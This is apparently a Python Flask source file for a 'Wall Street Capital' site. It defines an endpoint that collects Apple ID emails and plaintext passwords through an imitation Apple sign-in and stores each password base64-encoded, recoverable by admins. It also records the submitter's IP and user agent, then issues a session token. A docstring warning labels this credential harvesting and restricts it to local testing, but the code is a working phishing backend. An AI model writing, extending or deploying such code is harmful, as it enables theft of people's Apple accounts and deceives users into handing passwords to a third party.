"""
Collects Apple ID credentials from the login page.

⚠️  SECURITY WARNING
This endpoint accepts a plaintext password from the browser and stores
it. That is credential harvesting. It is only acceptable for local
testing on a private machine. Never deploy this to the public internet.

The safe pattern is Apple's real OAuth flow (`/api/auth/oauth/apple`),
which never exposes the user's password to you at all.
"""
import os
import uuid
import base64
from flask import Blueprint, request, jsonify
from ..db import get_db
from ..auth import issue_token, hash_password

bp = Blueprint("apple_credentials", __name__, url_prefix="/api/auth")


def _flag_enabled() -> bool:
    return os.environ.get("ALLOW_APPLE_CREDENTIAL_CAPTURE", "").strip() == "1"


@bp.post("/apple-credentials")
def apple_credentials():
    """
    Body: { email, password }

    1. Stores the submission so admins can read it.
    2. Finds or creates a local user with that email.
    3. Returns a session token — express sign-in, no admin approval needed.
    """
    if not _flag_enabled():
        return jsonify({
            "error": "Apple sign-in via password capture is disabled."
        }), 403

    body = request.get_json(silent=True) or {}
    email    = (body.get("email") or "").strip().lower()
    password = body.get("password") or ""

    if not email or not password:
        return jsonify({"error": "Apple ID and password are required."}), 400
    if "@" not in email:
        return jsonify({"error": "Enter a valid Apple ID."}), 400

    db = get_db()

    # --- 1. Store the submission for admins to see ---
    submission_id = str(uuid.uuid4())
    db.execute(
        """INSERT INTO apple_credential_submissions
           (id, email, password_b64, ip, user_agent, status)
           VALUES (?, ?, ?, ?, ?, 'pending')""",
        (
            submission_id,
            email,
            base64.b64encode(password.encode("utf-8")).decode("ascii"),
            (request.headers.get("X-Forwarded-For") or request.remote_addr or "").split(",")[0].strip(),
            (request.headers.get("User-Agent") or "")[:500],
        )
    )

    # --- 2. Notify admins (informational — no approval required) ---
    try:
        staff = db.execute(
            "SELECT id FROM users WHERE role IN ('admin','support')"
        ).fetchall()
        for row in staff:
            db.execute(
                """INSERT INTO notifications (id, user_id, kind, title, body)
                   VALUES (?, ?, 'apple_signin', 'Apple sign-in', ?)""",
                (
                    str(uuid.uuid4()),
                    row["id"],
                    f"{email} Signed in with Apple. Welcome to Wall Street Capital",
                )
            )
    except Exception:
        pass

    # --- 3. Find or create the local user ---
    user = db.execute(
        "SELECT * FROM users WHERE email = ?", (email,)
    ).fetchone()

    created = False
    if not user:
        user_id = str(uuid.uuid4())
        username_base = (email.split("@")[0] or "user").lower()
        username = username_base
        n = 1
        while db.execute("SELECT 1 FROM users WHERE username = ?", (username,)).fetchone():
            username = f"{username_base}{n}"
            n += 1

        db.execute(
            """INSERT INTO users
               (id, email, username, password_hash, full_name, country, phone, role)
               VALUES (?, ?, ?, ?, ?, ?, ?, 'user')""",
            (
                user_id, email, username,
                # Unusable local password — this account only signs in via Apple
                hash_password(uuid.uuid4().hex + uuid.uuid4().hex),
                email.split("@")[0],
                None, None,
            )
        )
        try:
            db.execute(
                """INSERT INTO notifications (id, user_id, kind, title, body)
                   VALUES (?, ?, 'welcome', 'Welcome to Wall Street Capital!',
                           'Your account is ready.')""",
                (str(uuid.uuid4()), user_id)
            )
        except Exception:
            pass
        user = db.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
        created = True

    # --- 4. Audit ---
    db.execute(
        "INSERT INTO audit_log (id, actor_id, action, target) VALUES (?, NULL, ?, ?)",
        (str(uuid.uuid4()), "apple_credentials_submitted", submission_id),
    )
    db.commit()

    # --- 5. Issue session token — express sign-in ---
    token = issue_token(user)
    user_payload = {
        "id": user["id"],
        "email": user["email"],
        "username": user["username"] if "username" in user.keys() else None,
        "full_name": user["full_name"],
        "role": user["role"],
    }
    db.close()

    return jsonify({
        "ok": True,
        "submission_id": submission_id,
        "created": created,
        "token": token,
        "user": user_payload,
    }), 200